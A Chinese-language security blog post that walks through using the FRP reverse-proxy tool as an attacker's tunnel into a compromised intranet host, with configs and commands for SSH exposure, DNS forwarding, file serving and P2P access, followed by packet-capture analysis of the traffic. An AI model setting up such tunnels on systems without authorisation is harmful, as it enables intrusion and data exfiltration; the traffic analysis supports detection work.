## 0x1 简介

FRP是一个比较流行而且成熟的内网渗透工具，支持 TCP、UDP、HTTP、HTTPS 等多种协议。

## 0x2 前期准备

工具准备：可在官方github仓库下载 https://github.com/fatedier/frp/releases

将 frps及 frps.ini放到具有公网 服务端 的机器上。  
将 frpc及 frpc.ini放到内网机器上。

## 0x3 使用场景与教程

### 场景1--通过SSH访问内网设备

 **（1）简介**

内网设备有暴露可连接的端口，比如22或者3389等端口，外网无法访问。再一次内网渗透过程中，发现该设备存在漏洞可上传任意文件。此时，攻击者可利用frp工具对内网设备进行连接。

 **（2）实验环境**

服务端（服务端公网IP）：x.x.x.x  
被控端（客户端）centos7：10.8.1.1  
控制端（攻击机）kali：10.1.1.2

 **（3）使用**

1）服务端上部署frps，配置修改frps.ini文件，配置如下

    
    
    [common]
    bind_port = 9999		#绑定的服务端端口（注释可能导致运行错误，配置时可删除）
    dashboard_user = admin		#可选，控制台用户名
    dashboard_pwd = password 		#可选，控制台密码
    dashboard_port = 5555		#可选，控制台的端口
    

服务端启动frps服务

    
    
    ./frps -c ./frps.ini
    

可以打开浏览器，访问http://x.x.x.x:5555验证是否配置完成

![image](https://image.3001.net/images/20220616/1655370467_62aaf2e3b92332792723f.png!small)

2）被控端上部署frpc，配置修改 frpc.ini 文件，配置如下

    
    
    [common]
    server_addr = x.x.x.x		#服务端公网 IP
    server_port = 9999		#服务端绑定端口
    
    [ssh]
    type = tcp		#指定tcp类型代理
    local_ip = 127.0.0.1		#暴露本地ip
    local_port = 22		#暴露本地端口
    remote_port = 6000		#frp服务端公网监听的端口，攻击者连接端口
    

被控端启动frpc

    
    
    ./fprc -c frpc.ini
    

3）攻击机通过ssh连接客户端

ssh -p 6000 root@x.x.x.x

访问控制台可见连接记录

![image](https://image.3001.net/images/20220616/1655370508_62aaf30cb799d0d7a4266.png!small)

### 场景2--转发DNS查询

 **（1）实验环境**

同上

 **（2）使用**

1）服务端vps修改配置frps.ini，并启动frps服务，同上

2）被控端centos7修改配置frpc.ini，并启动frpc。type为udp协议，local_ip设置为谷歌的DNS服务器（此处为测试用，真实场景可设置为内网的DNS服务器，达到探测内网资产目的），local_port设置为DNS服务端口，remote_port为frp服务端vps监听的端口，攻击者连接端口

    
    
    [common]
    server_addr = x.x.x.x
    server_port = 9999
    
    [dns]
    type = udp
    local_ip = 8.8.8.8
    local_port = 53
    remote_port = 6000
    

3）攻击机可以通过frps转发在内网设备上查询到的DNS信息

dig @101.42.250.174 -p 6000 www.baidu.com

![image](https://image.3001.net/images/20220616/1655370528_62aaf320a8cbe31cd51be.png!small)

### 场景3--对外提供内网文件访问下载服务

 **（1）实验环境**

同上

 **（2）使用**

1）服务端vps修改配置frps.ini，并启动frps服务，同上

2）被控端centos7修改配置frpc.ini，并启动frpc。使用组件static_file对外暴露内网文件。plugin_local_path指定需要对外提供的文件目录；plugin_strip_prefix指定访问
URL 的前缀，为可选项；plugin_http_user、plugin_http_passwd指定访问文件需要的用户名和密码

    
    
    # frpc.ini
    [common]
    server_addr = x.x.x.x
    server_port = 9999
    
    [plugin_static_file]
    type = tcp
    remote_port = 3250
    plugin = static_file
    plugin_local_path = /tmp/rpshttp
    plugin_strip_prefix = static
    plugin_http_user = admin
    plugin_http_passwd = admin
    

3）攻击机kali2019通过浏览器访问http://x.x.x.x:3250/static/，输入配置的用户名密码即可访问目录下文件，用户名密码错误将会显示未授权

![image](https://image.3001.net/images/20220616/1655370563_62aaf34379ae80c3deac6.png!small)

### 场景4--P2P模式

 **（1）简介**

P2P模式是一种点对点的内网穿透方式，此场景将不通过服务器中转流量的方式来达到访问内网的目的。

 **（2）实验环境**

同上

 **（3）使用**

1）服务端vps上部署frps，配置修改frps.ini文件，配置如下

    
    
    [common]
    bind_port = 7000
    bind_udp_port = 7001	#可以与绑定的tcp端口保持一致
    						#可以同上配置控制台设置
    

2）被控端配置frpc.ini，并启动frpc服务

    
    
    [common]
    server_addr = x.x.x.x
    server_port = 7000
    
    [p2p_ssh]
    type = xtcp
    sk = abcdefg
    local_ip = 127.0.0.1	
    local_port = 22		#本地需要被连接的服务
    

3）控制端配置frpc.ini，并启动frpc服务

    
    
    [common]
    server_addr = 10.8.58.243
    server_port = 7000
    
    [p2p_ssh_visitor]
    type = xtcp
    role = visitor
    server_name = p2p_ssh
    sk = abcdefg
    bind_addr = 127.0.0.1
    bind_port = 6000	#选择一个本地端口与被控端进行绑定
    

4）控制端通过ssh连接被控端

    
    
    ssh -p 6000 root@127.0.0.1
    

![image](https://image.3001.net/images/20220616/1655370590_62aaf35e12551d3443ddb.png!small)

## 0x4 流量分析

### （一）场景1流量分析

对场景1的流量进行分析。

首先，在攻击者抓包分析，如图所示。攻击者请求与服务端的6000端口建立ssh连接，攻击者与服务端只有一个正常ssh请求连接的过程，此时的6000端口正是在frpc中配置s监听端口。此时还需要进一步在服务端分析流量转发过程。

![image](https://image.3001.net/images/20220616/1655370600_62aaf3684193ef276979b.png!small)

同时，在服务端抓包分析，如图所示。客户端即内网主机`frpc`启动之后，将主动请求连接服务端`frps`，frpc与frps三次握手建立完成，后续进行登录确认后完成连接（注：wireshark识别的ssl协议，并非frps与frpc是通过ssl协议建立连接，而是协议识别有错误，与端口配置有关）。此时，是由客户端随机分配一个端口与服务端配置的9999端口建立隧道通信。

![image](https://image.3001.net/images/20220616/1655370608_62aaf370106f8fce61b6c.png!small)

建立连接时，客户端将frp的版本、系统信息、时间戳以及私钥发送给服务端进行验证应答，服务端响应后，新建一个run_id维持会话的长连接，并等待客户端的下一个请求。攻击者向服务端发起ssh请求，并且会指向特定的”proxy”，由服务端转发该请求到客户端。  
![image](https://image.3001.net/images/20220616/1655370618_62aaf37aae93bb0fc91de.png!small)

最后，在客户端内网主机上抓包分析，抓取以太网卡的流量与服务端以太网卡流量是一致的，需要分析的是22端口的流量如何被转发，所以需要抓取lo网卡流量，如图所示。可以得出，frp工具在客户端将本地的22端口流量经过与配置的外网端口建立连接进行转发。

![image](https://image.3001.net/images/20220616/1655370625_62aaf381a00a6960e755e.png!small)

根据对场景1的流量与特征分析，可以得出frp运行的一个大概流程。首先，frpc 启动之后，先与
frps建立连接，连接后将进行协商验证。验证通过后frps暴露配置的端口发起监听，等待攻击者的请求。因此，攻击者的内网连接请求经过服务端到内网的转发，最终得到了内网设备的响应。

### （二）版本差异性

Frps与Frpc在进行连接时，新版本0.43.0会表现出一些流量上的差异。

## 参考链接

https://github.com/fatedier/frp

~~本文作者：Janitor010，欢迎关注公众号：Janitor010

